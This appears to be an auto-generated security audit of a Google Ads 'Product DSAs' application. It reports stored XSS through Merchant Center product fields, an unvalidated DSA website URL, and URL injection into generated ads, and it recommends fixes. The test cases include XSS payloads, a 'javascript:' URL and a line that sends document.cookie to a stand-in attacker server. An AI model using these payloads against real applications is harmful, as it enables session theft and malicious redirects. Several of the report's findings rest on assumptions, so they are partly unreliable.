## Vulnerability Report

This report summarizes identified high and critical vulnerabilities within the Product DSAs application. Each vulnerability is detailed below, including its description, potential impact, severity ranking, current mitigation status, missing mitigations, preconditions for exploitation, source code analysis, and a security test case.

### 1. Potential Stored Cross-Site Scripting (XSS) in Product Data Display

- **Description:**
  1. An attacker with access to Google Merchant Center (GMC) modifies product data (e.g., title, description) to include a malicious JavaScript payload.
  2. The Product DSAs application, through its data gateway, fetches this modified product data from GMC.
  3. The backend API of Product DSAs serves this product data to the frontend web application without proper sanitization.
  4. A user, while interacting with the Product DSAs web interface (e.g., reviewing product data, campaign previews), triggers the rendering of this unsanitized product data in their browser.
  5. The malicious JavaScript payload embedded in the product data executes in the user's browser within the context of the Product DSAs web application.

- **Impact:**
  - **High**: Successful exploitation can lead to session hijacking (stealing user session cookies), account takeover, or manipulation of Google Ads campaign settings within the application's context. An attacker could potentially modify campaigns, budgets, or targeting settings, leading to financial loss or reputational damage for the victim.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - **None evident in the provided backend code.** The provided backend code focuses on data retrieval and processing but lacks explicit output sanitization mechanisms for web rendering. It is assumed that backend is not sanitizing data before sending to frontend.

- **Missing Mitigations:**
  - **Input Sanitization on the Backend**: The backend API should sanitize all data retrieved from external sources like Google Merchant Center before serving it to the frontend. This should include encoding or escaping HTML special characters and JavaScript-sensitive characters to prevent the execution of malicious scripts.
  - **Context-Aware Output Encoding on the Frontend**: The frontend web application should employ context-aware output encoding when rendering any data received from the backend, especially product data that originates from GMC or user inputs. This ensures that data is treated as data and not executable code in the browser.
  - **Content Security Policy (CSP)**: Implementing a strict Content Security Policy (CSP) can significantly mitigate the impact of XSS vulnerabilities by controlling the sources from which the browser is allowed to load resources and execute scripts.

- **Preconditions:**
  1. **Attacker Access to Google Merchant Center (GMC):** The attacker needs to have sufficient permissions within the victim's Google Merchant Center account to modify product data. This could be through compromised credentials or insider access.
  2. **Vulnerable Frontend Application:** The Product DSAs frontend application must be vulnerable to XSS, meaning it renders backend data without proper output encoding.
  3. **User Interaction:** A user with access to the Product DSAs application needs to interact with the application in a way that triggers the display of the compromised product data.

- **Source Code Analysis:**
  - **File: /code/app/data_gateway.py:** This file is responsible for fetching data from BigQuery, which in turn is populated from Google Merchant Center. The `load_products` function executes SQL queries (`get-products.sql`) to retrieve product information.
  - **File: /code/app/main.py:** The `execute` function orchestrates the data flow, calling `data_gateway.load_products` to fetch product data. This data is then used to generate campaign data for Google Ads Editor. The `server/server.py` (not analyzed in detail here as focus is backend) would likely serve this data via API endpoints.
  - **Absence of Sanitization:** Review of `/code/app/data_gateway.py`, `/code/app/main.py`, and `/code/server/server.py` shows no explicit sanitization or output encoding of product data before it's potentially served through the API. The code focuses on data retrieval and processing for Google Ads, not secure web rendering.

  ```
  # Visualization of potential data flow and XSS injection point:

  Google Merchant Center (GMC) --> [Attacker injects XSS payload into product data] --> Modified GMC Product Data
                                      |
                                      V
  Product DSAs Data Gateway (/code/app/data_gateway.py) --> Fetches Modified Product Data from GMC
                                      |
                                      V
  Product DSAs Backend API (/code/server/server.py) --> Serves Unsanitized Product Data via API
                                      |
                                      V
  Product DSAs Frontend Web Application --> Renders Unsanitized Product Data in User's Browser --> [XSS Payload Execution]
  ```

- **Security Test Case:**
  1. **Precondition:** Ensure you have access to a Google Merchant Center account connected to a Product DSAs instance.
  2. **Login to Google Merchant Center:** Access the Google Merchant Center interface.
  3. **Modify Product Data:** Locate a product in your GMC feed and edit its `title` field to include the following XSS payload: `<script>alert('XSS Vulnerability')</script>`. Save the changes in GMC.
  4. **Access Product DSAs Web Application:** Open the Product DSAs web application in a browser and log in as a user with access.
  5. **Navigate to Product Data Display:** Navigate to a section in the Product DSAs application where product data (including titles) is displayed. This might be a product list view, a campaign preview, or any page that shows product information fetched from GMC.
  6. **Observe for XSS:** Check if an alert box with the message "XSS Vulnerability" appears in your browser when the page loads or when you interact with elements displaying the modified product title.
  7. **Verify Cookie Stealing (Advanced):** If the alert is successful, modify the payload to attempt cookie stealing. For example, change the payload to: `<script>window.location='http://attacker-server.com/log?cookie='+document.cookie;</script>`. Replace `http://attacker-server.com/log` with a server you control to capture the cookies. Monitor your attacker server logs to see if session cookies from the Product DSAs application are successfully sent when you interact with the application's interface displaying the modified product.

### 2. Missing Input Validation for DSA Website URL

- **Description:**
    1. An attacker can access the web configuration interface of the Product DSAs application.
    2. In the configuration settings, the attacker locates the "DSA Website" field, which is used to specify the website for Dynamic Search Ads.
    3. The attacker inputs a malicious URL, such as `http://attacker-controlled-site.com`, or a URL containing special characters or scripts, into the "DSA Website" field.
    4. The application saves this malicious URL as part of the target configuration.
    5. When the application generates Dynamic Search Ads based on this configuration, it uses the attacker-supplied malicious URL as the target website for the ads.
    6. Users who click on these generated ads will be redirected to the attacker-controlled site or potentially exposed to malicious content, instead of the intended website.

- **Impact:**
    - **Malicious Redirects:** Users clicking on ads generated by the Product DSAs application could be redirected to attacker-controlled websites. This can lead to phishing attacks, malware distribution, or damage to the victim's brand reputation if users associate the malicious redirects with the legitimate brand.
    - **Unintended Campaign Settings:** While not explicitly demonstrated in the provided code, missing validation in other configuration fields could lead to unintended or malicious campaign settings, such as incorrect bidding strategies, targeting, or ad schedules, wasting the victim's ad spend and potentially harming their Google Ads account performance.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    - None observed in the provided project files. There is no explicit input validation for the `dsa_website` field in the configuration validation functions (`ConfigTarget.validate` or `Config.validate` in `/code/common/config_utils.py`).

- **Missing Mitigations:**
    - **Input Validation for DSA Website URL:** Implement robust input validation for the "DSA Website" field in the web configuration interface. This should include:
        - **Format validation:** Ensure the input is a valid URL format (e.g., using regular expressions or URL parsing libraries).
        - **Protocol validation:** Restrict allowed protocols to `http://` and `https://` and disallow protocols like `javascript:`, `data:`, or `file:`.
        - **Domain validation (optional but recommended):** Implement checks to ensure the domain is associated with the legitimate business and prevent the use of suspicious or blacklisted domains.
        - **Sanitization:** Sanitize the input to remove or encode any potentially malicious characters or scripts before storing and using it.

- **Preconditions:**
    - The attacker needs access to the web configuration interface of a deployed instance of the Product DSAs application. This access is protected by Google Identity-Aware Proxy (IAP), so the attacker would need to be granted "IAP-secured Web App User" role or exploit a vulnerability to bypass IAP.
    - The victim must have configured and be using the Product DSAs application to generate Dynamic Search Ads.

- **Source Code Analysis:**
    1. **Configuration Loading:** The configuration, including the `dsa_website`, is loaded from `config.json` (or GCS if configured) using `config_utils.get_config` in `/code/common/config_utils.py` and used throughout the application.
    2. **`ConfigTarget` Class:** The `ConfigTarget` class in `/code/common/config_utils.py` defines the `dsa_website` attribute, but the `validate` method in `ConfigTarget` (and `Config`) does not include any specific validation rules for the `dsa_website` URL format or content.

    ```python
    # File: /code/common/config_utils.py
    class ConfigTarget(ConfigItemBase):
        # ...
        dsa_website: str = ''
        # ...
        def validate(self, generation=False) -> List:
            errors = []
            if not self.name or re.match('[^A-Za-z0-9_\-]', self.name):
                errors.append({
                    'field':
                        'name',
                    'error':
                        'Target name should not contain spaces (only symbols A-Za-z,0-9,_,-)'
                })
            if generation:
                if not self.page_feed_spreadsheetid:
                    errors.append({
                        'field': 'page_feed_spreadsheetid',
                        'error': 'No spreadsheet id for page feed found in configuration'
                    })
                if not self.dsa_website: # <--- Check for emptiness, but no format/content validation
                    errors.append({
                        'field': 'dsa_website',
                        'error': 'No DSA website found in configuration'
                    })
                # ...
            return errors
    ```
    3. **Campaign Generation (`/code/campaign_mgr.py`):** The `GoogleAdsEditorMgr` class in `/code/campaign_mgr.py` retrieves the `dsa_website` from the `context.target` and directly includes it in the campaign data for Google Ads Editor CSV generation without any further validation or sanitization.

    ```python
    # File: /code/campaign_mgr.py
    class GoogleAdsEditorMgr:
        # ...
        def add_campaign(self, name):
            campaign = self.__create_row()
            campaign_details = {
                CAMP_NAME: name,
                DSA_WEBSITE: self._context.target.dsa_website, # <--- dsa_website from config is used directly
                DSA_LANG: self._context.target.dsa_lang or '',
                DSA_TARGETING_SOURCE: 'Page feed',
                DSA_PAGE_FEEDS: self._context.target.page_feed_name
            }
            campaign.update(campaign_details)
            self._rows.append(campaign)
        # ...
    ```
    4. **No Sanitization or Validation before API Call:** There is no code in the provided files that sanitizes or validates the `dsa_website` before it is used in the generated CSV for Google Ads Editor. This CSV is intended to be uploaded to Google Ads Editor, which then uses this information to create Dynamic Search Ads in the victim's Google Ads account.

- **Security Test Case:**
    1. **Prerequisites:**
        - Deploy the Product DSAs application to Google Cloud Platform using the provided installation scripts.
        - Ensure IAP is enabled for the application and you have "IAP-secured Web App User" access.
        - Access the application through the provided App Engine URL.
        - Log in using your authorized Google account.
        - Navigate to the configuration settings of the application (assuming a web UI exists - not explicitly shown in files, but implied by "web configuration interface").
    2. **Steps:**
        - Locate the "DSA Website" configuration field in the web interface.
        - Enter the following malicious URL into the "DSA Website" field: `javascript:alert('XSS')`
        - Save the configuration changes.
        - Trigger the campaign generation process within the Product DSAs application (e.g., by running the wizard or API call).
        - Download the generated campaign CSV zip file.
        - Open the generated campaign CSV file (e.g., `gae-campaigns.csv`) and examine the "DSA Website" column.
    3. **Expected Result:**
        - The "DSA Website" column in the CSV file should contain the malicious URL `javascript:alert('XSS')` exactly as it was entered, indicating that the input was not validated or sanitized.
        - **(Further Manual Test in Google Ads Editor - Not Automatable with Files Only):**  Attempt to upload this CSV file into Google Ads Editor and publish the campaigns to a Google Ads account. If successful, ads may be created with the malicious `javascript:` URL. Clicking these ads (if Google Ads allows such URLs, which is unlikely for `javascript:` but possible with other malicious URLs or redirects) could trigger unexpected behavior or redirect users to unintended sites. A more realistic test would involve using a URL that redirects to an attacker's site, e.g., using a service like `tinyurl.com` to create a redirect to `http://attacker-controlled-site.com`. Then, use the `tinyurl.com` link as the DSA Website and check if clicks redirect to the attacker's site.

### 3. Malicious URL Injection in Dynamically Generated Ads

- **Description:**
An attacker can inject malicious URLs into product titles or descriptions within the Google Merchant Center (GMC) feed. When Product DSAs processes this feed to generate Dynamic Search Ads (DSAs), these malicious URLs are incorporated into the ads without proper sanitization. As a result, when users click on these dynamically generated ads, they are redirected to attacker-controlled websites instead of the intended product pages.

- **Impact:**
Users clicking on ads generated by Product DSAs can be redirected to malicious websites. This can lead to various negative consequences, including:
    - **Phishing attacks:** Users might be tricked into entering credentials or sensitive information on fake websites mimicking legitimate ones.
    - **Malware distribution:** Users' devices could be infected with malware by visiting attacker-controlled websites.
    - **Reputation damage:** The organization running Product DSAs and its Google Ads campaigns can suffer reputational damage due to users being redirected to malicious content through their ads.
    - **Financial loss:** Misleading ads can lead to ineffective ad spending and lost potential sales.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
None. The code does not include any input sanitization or validation for product titles or descriptions before using them in ad generation.

- **Missing Mitigations:**
    - **Input Sanitization:** Implement robust sanitization of product titles and descriptions fetched from the GMC feed. This should include:
        - URL validation: Check if URLs are well-formed and potentially block or sanitize suspicious URLs.
        - HTML encoding: Encode HTML special characters to prevent interpretation as HTML code.
        - JavaScript removal: Strip out any JavaScript or other potentially malicious code from text fields.
    - **Content Security Policy (CSP):** Implement CSP headers to further mitigate the risk of XSS if any malicious code bypasses sanitization. Although, in this case, the primary risk is open redirect, CSP can be a general security improvement.

- **Preconditions:**
    - The attacker needs to have the ability to modify product data within the Google Merchant Center feed associated with the Google Ads account used by Product DSAs. This could be achieved if the attacker has compromised the GMC account or if there are vulnerabilities in the GMC data management processes.
    - Product DSAs application must be installed and configured to use the compromised GMC feed.
    - The dynamic search ad campaigns generated by Product DSAs must be running in Google Ads.

- **Source Code Analysis:**

1. **Data Fetching:**
   - File: `/code/app/data_gateway.py`
   - Function: `load_products(self, target: str, ...)`
   - This function executes SQL queries (`get-products.sql`) against BigQuery datasets populated by GMC data transfer. It fetches product data, including `title`, `description`, and `link`.
   - **Vulnerability Point:** The data fetched from BigQuery is assumed to be safe and is not sanitized at this stage.

   ```python
   def load_products(self,
                     target: str,
                     *,
                     in_stock_only: bool = False,
                     long_description: bool = False,
                     category_only: bool = False,
                     product_only: bool = False,
                     maxrows: int = 0):
       # ...
       products = self.execute_sql_script('get-products.sql', target, params)
       return products
   ```

2. **Ad Description and Ad Copy Generation:**
   - File: `/code/app/campaign_mgr.py`
   - Class: `GoogleAdsEditorMgr`
   - Function: `__get_ad_description(self, product)`
   - This function selects or generates an ad description from `product.custom_description`, `product.description`, or `product.title`. It prioritizes `custom_description`, then `description`, and finally `title`. It also attempts to split long descriptions into sentences, but there's no sanitization performed on the content itself.

   ```python
   def __get_ad_description(self, product):
       # ...
       if product.custom_description and len(
           product.custom_description) > 0 and len(
               product.custom_description) <= AD_DESCRIPTION_MAX_LENGTH:
         return product.custom_description

       if product.description and len(
           product.description) <= AD_DESCRIPTION_MAX_LENGTH:
         return product.description

       if product.title and len(product.title) <= AD_DESCRIPTION_MAX_LENGTH:
         return product.title
       # ...
   ```

3. **CSV Generation for Google Ads Editor:**
   - File: `/code/app/campaign_mgr.py`
   - Class: `GoogleAdsEditorMgr`
   - Function: `add_adgroup(...)`
   - This function constructs rows for the CSV file intended for Google Ads Editor. It includes the ad descriptions generated in `__get_ad_description` and other ad parameters. The `AD_DESCRIPTION` field in the CSV row will contain the potentially malicious URL if injected in GMC data.

   ```python
   def add_adgroup(self, campaign_name: str, adgroup_name: str,
                   is_product_level: bool, product, label: str,
                   images: List[str]):
       # ...
       ad_description = self.__get_ad_description(
           product) if is_product_level else self.__get_category_description(label)
       adgroup_details = {
           # ...
           AD_DESCRIPTION_ORIG: orig_ad_description,
           AD_DESCRIPTION: ad_description.strip() # Malicious URL flows into AD_DESCRIPTION
       }
       adgroup.update(adgroup_details)
       self._rows.append(adgroup)
       # ...
   ```

4. **Output to CSV:**
   - File: `/code/app/campaign_mgr.py`
   - Class: `GoogleAdsEditorMgr`
   - Function: `generate_csv(self, output_csv_path: str)`
   - This function writes the collected rows, including the `AD_DESCRIPTION` with potentially malicious URLs, into a CSV file. This CSV file is then meant to be uploaded to Google Ads Editor, thus propagating the vulnerability to live ads.

   ```python
   def generate_csv(self, output_csv_path: str):
       # ...
       with open(output_csv_path, 'w', encoding='UTF-16') as csv_file:
         writer = csv.DictWriter(csv_file, fieldnames=self._headers)
         writer.writeheader()
         writer.writerows(self._rows) # CSV file contains malicious URLs
   ```

**Visualization:**

```
[GMC Feed] --> (Malicious URL Injection) --> [BigQuery] --> (DataGateway.load_products) --> [Product DSAs App]
                                                                    |
                                                                    v
                                                    (CampaignMgr.__get_ad_description) --> [Ad Description with Malicious URL]
                                                                    |
                                                                    v
                                                      (CampaignMgr.add_adgroup) --> [CSV Row with Malicious URL in AD_DESCRIPTION]
                                                                    |
                                                                    v
                                                       (CampaignMgr.generate_csv) --> [CSV File with Malicious URLs] --> [Google Ads Editor Upload] --> [Live Google Ads with Malicious URLs] --> [User Click] --> [Malicious Website]
```

- **Security Test Case:**

1. **Precondition:**
    - Access to a Google Merchant Center account that is connected to a Product DSAs instance. For testing purposes, this could be a test GMC account.
    - Product DSAs application is installed and configured, and connected to the test GMC account.

2. **Steps:**
    - Log in to the Google Merchant Center account.
    - Navigate to the "Products" section and select a product.
    - Edit the product's "Title" or "Description" field.
    - Inject a malicious URL into the title or description. For example: `<a href="https://attacker.com">Click here</a>` or `[Malicious Link](https://attacker.com)`. For a simple redirect test, use a URL like `https://attacker.com`.
    - Save the changes to the product.
    - Run Product DSAs to generate campaign CSV files. This can be done through the application's UI or by directly executing the Python scripts.
    - Download the generated campaign CSV zip file.
    - Extract the CSV file and open it in a text editor or spreadsheet software.
    - Search for the modified product's ad description column.
    - **Verification:** Confirm that the malicious URL injected in the GMC product data is present in the `AD_DESCRIPTION` column of the generated CSV file, without any sanitization.
    - Upload the generated CSV file to Google Ads Editor and publish the changes to a test Google Ads campaign.
    - Once the ads are live (in the test campaign), search for the generated ad on Google Search (or Google Ads Preview tool).
    - Click on the generated Dynamic Search Ad.
    - **Verification:** Observe that clicking the ad redirects to the malicious URL (e.g., `https://attacker.com`) instead of the intended product page.

This test case demonstrates that malicious URLs injected into GMC product data can be successfully propagated through Product DSAs to live Google Ads, leading to a potential open redirect vulnerability.